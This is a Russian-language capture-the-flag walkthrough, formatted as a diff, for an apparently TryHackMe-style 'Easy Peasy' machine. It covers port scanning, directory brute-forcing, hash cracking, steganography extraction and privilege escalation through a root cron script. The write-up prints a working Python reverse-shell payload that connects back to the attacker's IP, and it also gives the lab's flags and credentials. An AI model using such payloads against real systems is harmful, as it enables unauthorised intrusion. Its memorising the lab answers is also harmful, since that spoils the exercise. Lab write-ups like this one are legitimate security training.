@@ -1,0 +1,113 @@
+1)└─#  nmap -A -p- -T4 10.10.56.212 
+при своем обычном сканированиия я обнаружила лишь один порт, теперь буду пользоваться этим способом
+80/tcp    open  http    nginx 1.16.1
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: nginx/1.16.1
+|_http-title: Welcome to nginx!
+6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
+|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
+|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
+65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.43 (Ubuntu)
+|_http-title: Apache2 Debian Default Page: It works
+
+как видите у нас два сайта , на порта 80, 65524
+
+FLAG-1
+2)└─# gobuster -e -u dir http://10.10.56.212  -w /root/Downloads/common.txt
+сначала обследуем 80 порт
+находим скрытую директорию hidden 
+ничего в ней не обнаруживаю
+продолжаю поиск
+└─# gobuster -e -u dir http://10.10.56.212/hidden  -w /root/Downloads/common.txt
+находим скрытую директорию whatever
+ZmxhZ3tmMXJzN19mbDRnfQ==
+иду в cyberchef и расшифровываю flag{f1rs7_fl4g}
+
+FLAG-2
+3)└─# gobuster -e -u dir http://10.10.56.212:65524  -w /root/Downloads/common.txt
+обследую 65524 порт, не нахожу там ничего кроме robots.txt, в котором какой то странный user-agent
+User-Agent:a18672860d0510e5ab6699730763b250
+пошла с этим на crackstation он не расшифровал
+пошла на https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250 и нашла
+flag{1m_s3c0nd_fl4g}
+
+FLAG-3
+обследуя страницу на наличие полезных комментариев обнаружила на странице  http://10.10.56.212:65524 
+ Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}
+
+на пути к логину и паролю
+
+ http://10.10.56.212:65524  в коде обнаружила 
+ <p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
+ иду в cyberchef и расшифровываю из base62 получаю 
+ /n0th1ng3ls3m4tt3r
+
+
+ 5)
+  http://10.10.56.212:65524/n0th1ng3ls3m4tt3r
+  это страница с текстом <p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
+  и картинкой src="binarycodepixabay.jpg" 
+
+  6)└─# hashcat -m 6900 hash /root/Desktop/easypeasy.txt
+в подсказке к заданиюю обнаруживаю подсказку что за формат захэширован(john у меня почему не получилось)
+mypasswordforthatjob
+
+думала надо сунуться с этим в гидру, в статье решения увидела что это пароль для изображения мдаааа не ищем легких путей
+
+7)└─# steghide extract -sf binarycodepixabay.jpg
+passphrase:mypasswordforthatjob
+
+в файле написан логин и зашифрованный пароль, ноу проблем cyberchef нам в помощью
+
+boring:iconvertedmypasswordtobinary
+
+user_flag
+
+ничего делать не надо сразу читаем user.txt
+
+root_flag
+
+вот с этим уже пришлось подумать
+
+sudo -l мне ничего не дало - мой пользователь не может использовать sudo
+
+8)find / -user root -perm /4000      or      find / -user root -perm /4000 2>/dev/null
+мне ничего не дало, решила загрузить linpeas.sh
+
+врубила на своей машине сервак
+└─# python3 -m http.server
+
+и загрузила linpeas.sh /home/boring
+
+заупустила его
+sh linpeas.sh
+
+и в одной и строк мне высветило 
+/var/www/.mysecretcronjob.sh
+
+тут то я и вспомнила что в названии фигуриловало cronjob
+
+прочитала его и увидела что он запукается от имени рута
+думала в него достаточно дописать /bin/bash , но он же запустится у меня с sudo 
+значит надо его сконнектить с соей машиной
+это делается так 
+
+9)
+#!/bin/bash
+python3 -c 'import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.9.5.2",1234));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/bash","-i"]);'
+
+на своей машине я врубила 
+└─# rlwrap nc -nlvp 1234 
+
+почему то просто с nc не сработало, я остала boring
+
